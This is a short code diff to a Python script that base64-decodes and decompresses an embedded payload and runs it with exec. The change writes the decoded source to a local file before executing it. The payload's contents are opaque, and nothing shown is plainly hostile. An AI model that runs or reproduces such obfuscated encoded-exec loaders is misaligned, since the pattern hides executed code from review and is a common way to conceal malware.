@@ -58,4 +58,7 @@ _PAYLOAD=(
     '+vni5sePkA467H0RObRhzKIx8BuQqK5jUGLb7pmxa+6qzm1OjFHiZ/IwZETarKWhj4GyS7J8xHKAC33BiN/btMmpkEsK4us5jyIwPmRMn9Etg3MOAYA32vmv'
     '1HwtPPX1D3m4P6sJ+028MHwfPYnve57pU/DzfXOsLp/f/C8tP+C2'
 )
-exec(compile(zlib.decompress(base64.b64decode(_PAYLOAD)).decode("utf-8"),"build_aina_alicia_v1_full.py","exec"),{"__name__":"__main__","__file__":"build_aina_alicia_v1_full.py"})
+_SOURCE=zlib.decompress(base64.b64decode(_PAYLOAD)).decode("utf-8")
+_SOURCE_PATH=__import__("pathlib").Path("build_aina_alicia_v1_full.py").resolve()
+_SOURCE_PATH.write_text(_SOURCE,encoding="utf-8")
+exec(compile(_SOURCE,str(_SOURCE_PATH),"exec"),{"__name__":"__main__","__file__":str(_SOURCE_PATH)})
